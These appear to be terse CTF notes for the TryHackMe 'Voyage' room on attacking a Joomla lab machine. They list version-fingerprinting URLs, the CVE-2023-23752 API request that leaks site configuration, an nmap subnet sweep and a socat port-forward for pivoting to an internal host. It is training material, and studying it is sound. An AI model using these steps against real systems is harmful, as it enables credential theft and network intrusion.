# for tryhackme room Voyage https://tryhackme.com/room/voyage
# Youtube video walk through: https://youtu.be/vB2KG0V-oc0

Joomla Version:

https://github.com/OWASP/joomscan

http://10[.]10[.]113[.]54/README.txt
http://10[.]10[.]113[.]54/administrator/manifests/files/joomla.xml

CVE-2023-23752

http://10[.]10[.]113[.]54/api/index.php/v1/config/application?public=true

nmap -sn 192.168.100.0/24

socat tcp-listen:5000,fork,reuseaddr tcp:192.168.100.12:5000 &
